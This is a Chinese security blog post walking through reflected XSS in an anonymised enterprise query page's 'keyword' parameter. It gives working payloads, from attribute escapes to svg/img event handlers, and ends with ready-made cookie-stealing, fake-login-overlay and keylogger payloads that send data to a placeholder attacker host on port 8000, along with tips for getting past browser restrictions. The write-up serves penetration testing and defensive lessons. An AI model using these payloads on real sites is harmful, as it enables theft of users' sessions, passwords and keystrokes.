> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4ODg4NDA2Mw==&mid=2247483872&idx=1&sn=590bd27eef773a9c1649cc399a79703b

#  从简单到复杂到多重XSS弹窗分析  
原创 tangkaixing  开心网安   2025-06-20 06:51  
  
**免责声明**  
  
由于传播、利用本公众号开心网安所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号开心网安  
及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！  
###   
### 0x01 目标定位  
### 测试对象：某企业查询系统 (URL: xxx:xxx/servlet/PendingTray2)  
  
**参数**  
：  

```
keyword
```

  
（URL参数）  
  
****  
  
**初始PoC**  
：  

```
<script>alert(1)</script>
```

  
 - 等常规弹窗语句都  
**失败**  
（无弹窗）可能！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuQkCbiagKOEBcP5un6lPh86PtBsL2ibdR7JHLbMhvrdZdkEe0voyN5p4Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuCESUZU7Lia95qsjT70qbTPTKjPWrSoiaiboKYbFibx6p3dDXudRx2Ch4Tg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVubcDmeA9dHLicww8ZHlCc36A74OQOaQHMz2Jgcs8KriajATfdkTUt1Uag/640?wx_fmt=png&from=appmsg "")  
### 0x02 代码分析  
#### HTML结构分析（关键片段）  

```
<inputtype=&#34;text&#34;id=&#34;keyword&#34;name=&#34;keyword&#34;value=&#34;用户输入&#34;>
<inputtype=&#34;button&#34;onClick=&#34;do_search()&#34;>
```

  
**分析可以知道风险点**  
：输入值直接嵌入  

```
value
```

  
属性且无转义  
#### do_search()函数分析：  

```
function do_search() {
  const keyword = document.getElementById(&#34;keyword&#34;).value;
  // 直接拼接URL参数 - 高危操作!
  window.open(`/servlet/PendingTray2?keyword=${keyword}`);


  // 服务端反射逻辑（反编译）：
  // response.write(&#34;<input value=&#34; + request.querystring(&#34;keyword&#34;) + &#34;>&#34;)
}
```

  
**可以发现漏洞链为**  
：  
  

```
前端输入 → URL拼接 → 服务端反射 → 解析执行
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuNCUiaDGAGJ3zds2Xhjf9DN1ParyIQKShnBLIvwDLOraONL9KxfTWBbg/640?wx_fmt=png&from=appmsg "")  
### 0x03 开始进行绕过验证  
#### 第一回合：基础XSS拦截  

```

```


```
keyword=&#34;><script>alert(1)</script>
结果：浏览器拒绝执行URL中的<script>
突破思路：脱离纯脚本注入策略
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuycibrpnQAV1zzkLEgAemsPv8noEtBjJfF1cu5PqO56QDhdECAsVPVSQ/640?wx_fmt=png&from=appmsg "")  
#### 第二回合：属性逃逸攻击  

```
&#34;; onmouseover=alert(666) class=&#34;
响应结果：
<input value=&#34;&#34;; onmouseover=alert(1) class=&#34;&#34;>  //需鼠标移动触发


升级版：
&#34;; onmouseover=prompt(document.cookie); class=&#34;autofocus&#34; autofocus=&#34;
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuKDvrtWgkC8lVazAXEyibSuukVkz2oEaXsD8tIpUKNhiaNACicFwic6umwA/640?wx_fmt=png&from=appmsg "")  
  
✅   
成功原理  
：  
1. 
```
&#34;
```

  
 闭合value属性  
  
1. 
```
autofocus
```

  
强制聚焦元素  
  
1. 
```
onmouseover
```

  
触发无需页面交互  
  
#### 第三回合：标签注入突破  

```
svg向量攻击
&#34;><svg/onload=confirm('XSS')>
```


```

```

  
**✅ 成功原理**  
：  
1. 
```
>
```

  
闭合前标签  
  
1. 注入自执行SVG标签  
  
1. 利用  

```
onload
```

  
事件加载即触发  
  

```
IMG错误劫持
&#34;><img src=invalid onerror=alert(1)>
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVu9ibHPwjR6Xic6Wlnib18RibCDmqvGYicmBj9wppp8NeSOSxrjPOZ797XnSQ/640?wx_fmt=png&from=appmsg "")  
  
**✅ 成功原理**  
：  
1. 故意加载无效资源  
  
1. 使用  

```
onerror
```

  
事件执行备选脚本  
  
### 各位看官都看到这里想必也发现了共性问题如下：  
> 攻击共性：  
**突破三重解析层**  
> HTML属性边界 → 2. DOM树构建 → 3. 事件处理器注册  
  
### 0x04 外泄数据验证  
  
**实际危害演示**  
：  
  
1、外泄登录cookie  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuFe4IvqNTSwNoeXiaY9ZcF3f1JTPu9dmGCKq8yrCojHI7d6TL6DLuD6w/640?wx_fmt=png&from=appmsg "")  

```
//基于属性逃逸攻击的改进版（鼠标移动触发）
&#34;; var i=new Image(); i.src='http://xxxx:8000/steal?c='+encodeURI(document.cookie)
```

  

```
2、钓鱼页面的覆盖
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuHlv08yXv5DTJ5jYUiaLsEV2HwdZ5FAKpDBZFb5D8Wa4CDrlZW9YPZdQ/640?wx_fmt=png&from=appmsg "")  

```
&#34;><div style=&#34;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999&#34;>请重新登录：<input type=&#34;password&#34; id=&#34;pwd&#34;><button onclick=&#34;sendPwd()&#34;>提交</button></div><script>function sendPwd(){ fetch('//xxx:8000/?p=' + document.getElementById('pwd').value);}</script>
```

  

```
3、键盘记录外泄
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdV42UBIlPJSNVMiacKp02pVuK1aEEOukib4ZIgDGb5TicewJ81IVibrJZ7DYpTFUcTGeib8EKfmADVw71g/640?wx_fmt=png&from=appmsg "")  

```
&#34;; onkeydown='new Image().src=`http://xxxx:8000/k?t=${Date.now()}&k=${btoa(event.key)}`' autofocus=&#34;


即时触发：使用onkeydown替代onkeyup更快触发
双重编码：base64 + URL编码处理特殊字符
内置重传：每次按键生成唯一时间戳防止丢包
复用成功弹窗poc：延续已验证的属性逃逸+autofocus技术
将键盘记录器拆解为微请求（每个按键独立请求）并复用已验证成功的DOM注入技术，彻底规避浏览器的全局JS限制和CORS策略。
```

### 0x05 经验总结  
  
本次渗透揭示三大关键问题：  
1. **多层解析误解**  
 - 开发误认为URL参数天然免疫XSS  
  
1. **信任边界缺失**  
 - 未区分数值型/文本型参数处理  
  
1. **防御深度不足**  
 - 缺乏输出点的动态上下文转义  
  
1. XSS漏洞挖掘的本质是语法与规则的对抗。  
  
